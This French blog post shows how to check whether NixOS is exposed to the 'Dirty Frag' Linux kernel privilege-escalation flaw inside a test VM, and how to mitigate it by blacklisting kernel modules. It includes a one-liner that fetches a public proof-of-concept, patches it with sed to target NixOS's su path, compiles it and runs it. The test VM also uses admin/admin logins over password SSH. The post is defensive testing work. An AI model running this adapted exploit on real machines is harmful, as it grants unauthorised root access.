Le faille Dirty Frag et NixOS

La faille

Jeudi 7 mai 2026 une faille Zeros day, nommée Dirty Frag (CVE-2026-43284 et CVE-2026-43500), a été publié. Un poc est disponible ici.

Ma NixOS est-elle vulnérable ?

Je ne souhaite pas tester sur mon pc, je vais utiliser une VM.

Pour commencer, je crée un fichier flake.nix dans un répertoire vide :

{
  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  # pour tester sur NixOS 25.11 on utilise cette ligne à la place :
  # inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-25.11";


  outputs =
    { self, nixpkgs, ... }@inputs:
    let
      system = "x86_64-linux";
    in
    {
      nixosConfigurations.test = nixpkgs.lib.nixosSystem {
        inherit system;
        modules = [
          ./configuration.nix
        ];
      };
      apps = {
        ${system}.default = {
          type = "app";
          program = "${inputs.self.nixosConfigurations.test.config.system.build.vm}/bin/run-nixos-vm";
        };
      };
    };
}

et un fichier configuration.nix :

{
 pkgs,
 ...
}:
{
 # décommmanter cette ligne pour avoire le linux 6.18
 # boot.kernelPackages = pkgs.linuxPackages_6_18;

 users.groups.admin = { };
 users.users = {
   admin = {
     isNormalUser = true;
     extraGroups = [ "wheel" ];
     password = "admin";
     group = "admin";
   };
 };

 security.sudo = {
   wheelNeedsPassword = false;
   execWheelOnly = true;
 };

 virtualisation.vmVariant = {
   virtualisation = {
     memorySize = 2048; # Use 2048MiB memory.
     cores = 4;
     graphics = false;
   };
 };

 nixpkgs.config.allowUnfree = true;

 services.openssh = {
   enable = true;
   settings.PasswordAuthentication = true;
 };

 networking.firewall.allowedTCPPorts = [ 22 ];
 environment.systemPackages = with pkgs; [
   cmake
   git
   gcc
 ];

 system.stateVersion = "26.05";
}

Je lance nix run cela crée et lance la VM. Je me connecte avec le login "admin" et le mot de pass "admin".

Puis, je teste l'exploit avec :

git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp

Et cela ne marche pas. On est safe ? Non ici le problème, est que NixOS su n'est pas dans /usr/bin/su mais /run/current-system/sw/bin/su.

Je modifie le fichier avec :

sed -i 's|/usr/bin/su|/run/current-system/sw/bin/su|g' exp.c

Je rebuild et je teste :

gcc -O0 -Wall -o exp exp.c -lutil && ./exp

Et bin cela passe.

En une ligne :

git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && sed -i 's|/usr/bin/su|/run/current-system/sw/bin/su|g' exp.c && gcc -O0 -Wall -o exp exp.c -lutil && ./exp

Pour arrêter la VM :

sudo halt -p

Atténuation

Dans le poc il nous donne cette commande, pour atténuer la faille :

sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"

Pour atténuer la faille, cela ne devrait pas marcher sur NixOS.

À la place à côté de mon flake.nix, je crée un fichier mitigation.nix :

{
  config,
  ...
}: {
  boot.blacklistedKernelModules = [ "esp4" "esp6" "rxrpc" ];

    environment.etc."modprobe.d/dirtyfrag.conf".text = ''
      install esp4 /run/current-system/sw/bin/false
      install esp6 /run/current-system/sw/bin/false
      install rxrpc /run/current-system/sw/bin/false
  '';
}

Je modifie le fichier flake.nix :

{
  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";

  outputs =
    { self, nixpkgs, ... }@inputs:
    let
      system = "x86_64-linux";
    in
    {
      formatter.${system} = nixpkgs.legacyPackages.${system}.nixfmt-tree;
      nixosConfigurations.test = nixpkgs.lib.nixosSystem {
        inherit system;
        modules = [
          ./configuration.nix
          ./mitigation.nix # ajoute cette ligne.
        ];
      };
      apps = {
        ${system}.default = {
          type = "app";
          program = "${inputs.self.nixosConfigurations.test.config.system.build.vm}/bin/run-nixos-vm";
        };
      };
    };
}

Je lance la VM nix run.

On teste :

cd dirtyfrag/; ./exp

Ici, j'ai relancé la VM donc pas besoin de décharger les modules du noyau avec : rmmod esp4 esp6 rxrpc 2>/dev/null ni de reset le page cache avec : echo 3 > /proc/sys/vm/drop_caches.
